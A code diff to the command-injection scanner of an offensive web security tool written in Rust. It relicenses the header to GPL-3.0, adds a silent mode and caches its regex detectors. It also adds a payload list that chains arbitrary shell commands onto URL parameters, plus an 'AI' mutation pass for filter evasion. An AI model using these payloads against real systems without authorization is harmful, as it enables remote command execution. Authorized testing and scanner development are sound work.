@@ -15,24 +15,19 @@
 //
 //
 // ---------------------------------------------------------------------------
-//   WARNING / 警告 / 警告
+//   LICENSE / ライセンス — GNU General Public License v3 (GPL-3.0)
 // ---------------------------------------------------------------------------
-//  This source code is the exclusive property of HyperSecurityOffensiveLabs.
-//  You are permitted to VIEW this code for educational and reference
-//  purposes only. You may NOT modify, distribute, sublicense, or create
-//  derivative works without explicit written permission from khaninkali
-//  and the HyperSecurityOffensiveLabs development team.
+//  This program is free software: you can redistribute it and/or modify
+//  it under the terms of the GNU General Public License as published by
+//  the Free Software Foundation, either version 3 of the License, or
+//  (at your option) any later version.
 //
-//  このソースコードはHyperSecurityOffensiveLabsの独占的知的財産です
-//  教育目的および参照目的での閲覧のみ許可されています
-//  khaninkaliおよびHyperSecurityOffensiveLabs開発チームの
-//  書面による明示的な許可なく修正配布サブライセンス
-//  または二次的著作物の作成を禁止します
+//  This program is distributed in the hope that it will be useful,
+//  but WITHOUT ANY WARRANTY; without even the implied warranty of
+//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+//  GNU General Public License for more details.
 //
-//  本源代码是HyperSecurityOffensiveLabs的独家财产
-//  仅允许出于教育和参考目的查看未经khaninkali和
-//  HyperSecurityOffensiveLabs开发团队的书面明确许可，
-//  禁止修改分发再许可或创建衍生作品
+//  OXIDE v8.7.2-community-edition — HyperSecurityOffensiveLabs
 // ---------------------------------------------------------------------------
 //
 //
@@ -41,11 +36,28 @@ use crate::http::client::{HttpClient, HttpClientConfig};
 use crate::http::request::HttpRequest;
 use crate::detection::analyzer::{Finding, Severity};
 use crate::cli::display::{HISUI, SHU, TSUYUKUSA, FUJI};
+use std::sync::OnceLock;
 use std::time::{Duration, Instant};
 use std::io::{self, Write};
 use anyhow::Result;
+use regex::Regex;
 use serde::{Deserialize, Serialize};
 use colored::Colorize;
+
+fn uid_re() -> &'static Regex {
+    static RE: OnceLock<Regex> = OnceLock::new();
+    RE.get_or_init(|| Regex::new(r"uid=\d+").expect("valid regex"))
+}
+
+fn gid_re() -> &'static Regex {
+    static RE: OnceLock<Regex> = OnceLock::new();
+    RE.get_or_init(|| Regex::new(r"gid=\d+").expect("valid regex"))
+}
+
+fn uname_re() -> &'static Regex {
+    static RE: OnceLock<Regex> = OnceLock::new();
+    RE.get_or_init(|| Regex::new(r"uname=\w+").expect("valid regex"))
+}
 
 fn tc(s: &str, c: (u8, u8, u8)) -> String { s.truecolor(c.0, c.1, c.2).to_string() }
 
@@ -64,6 +76,8 @@ pub struct CmdInjectionScanner {
     client: HttpClient,
     findings: Vec<Finding>,
     target: String,
+    /// Suppress internal progress prints (live-bar worker mode).
+    silent: bool,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -114,7 +128,13 @@ impl CmdInjectionScanner {
             client,
             findings: Vec::new(),
             target,
+            silent: false,
         })
+    }
+
+    /// Suppress internal progress prints (used by live-bar workers).
+    pub fn set_silent(&mut self, silent: bool) {
+        self.silent = silent;
     }
 
     /// Execute command via injection and capture output.
@@ -123,7 +143,7 @@ impl CmdInjectionScanner {
         use crate::utils::url::UrlUtil;
         let start_time = Instant::now();
 
-        let payloads = vec![
+        let mut payloads = vec![
             format!("; {} 2>&1", command),
             format!("| {} 2>&1", command),
             format!("& {} 2>&1", command),
@@ -132,6 +152,13 @@ impl CmdInjectionScanner {
             format!("&& {} 2>&1", command),
             format!("|| {} 2>&1", command),
         ];
+
+        //  AI変異補完 / PayloadMutator second-pass variants for filter evasion
+        {
+            let base = payloads.clone();
+            let mut mutator = crate::ai::payload_mutator::PayloadMutator::new();
+            payloads.extend(mutator.mutate_multiple(&base, Some(1)).into_iter().take(7));
+        }
 
         for payload in payloads {
             let request_url = UrlUtil::inject_param(url, param, &payload);
@@ -566,13 +593,17 @@ impl CmdInjectionScanner {
 
     /// Scan a specific URL for command injection vulnerabilities
     pub async fn scan_url(&mut self, url: &str, params: &[String]) -> Result<Vec<Finding>> {
-        println!("[*] Scanning {} for command injection vulnerabilities (target: {})", url, self.target);
+        if !self.silent {
+            println!("[*] Scanning {} for command injection vulnerabilities (target: {})", url, self.target);
+        }
         
         let mut findings = Vec::new();
         
         // Test each parameter with command injection payloads
         for param in params {
-            println!("  [*] Testing parameter: {}", param);
+            if !self.silent {
+                println!("  [*] Testing parameter: {}", param);
+            }
             
             if let Some(finding) = self.test_param_for_cmd_injection(url, param).await {
                 findings.push(finding.clone());
@@ -674,10 +705,10 @@ impl CmdInjectionScanner {
             }
         }
         
-        if regex::Regex::new(r"uid=\d+").unwrap().is_match(&lower_response) {
+        if uid_re().is_match(&lower_response) {
             indicator_count += 2;
         }
-        if regex::Regex::new(r"gid=\d+").unwrap().is_match(&lower_response) {
+        if gid_re().is_match(&lower_response) {
             indicator_count += 2;
         }
         
@@ -693,7 +724,7 @@ impl CmdInjectionScanner {
             }
         }
         
-        if regex::Regex::new(r"uname=\w+").unwrap().is_match(&lower_response) {
+        if uname_re().is_match(&lower_response) {
             indicator_count += 1;
         }
         
